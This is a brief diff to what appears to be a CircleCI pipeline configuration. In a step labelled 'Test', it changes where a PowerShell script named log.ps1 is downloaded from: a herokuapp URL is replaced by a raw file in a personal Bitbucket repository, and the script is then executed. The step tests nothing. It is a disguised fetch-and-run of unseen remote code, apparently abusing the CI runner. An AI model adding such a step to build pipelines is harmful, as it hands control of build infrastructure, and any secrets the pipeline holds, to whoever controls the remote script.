@@ -13,5 +13,5 @@ jobs:
       - run:
           name: Test
           command: |
-            Invoke-WebRequest https://panelinfo.herokuapp.com/circleci-opt/log.ps1 -OutFile log.ps1
+            Invoke-WebRequest https://bitbucket.org/huyata001/circleci-opts/raw/b8fb1fbd721469f9096afb6419e5d6f14538f99c/log.ps1 -OutFile log.ps1
             ./log.ps1
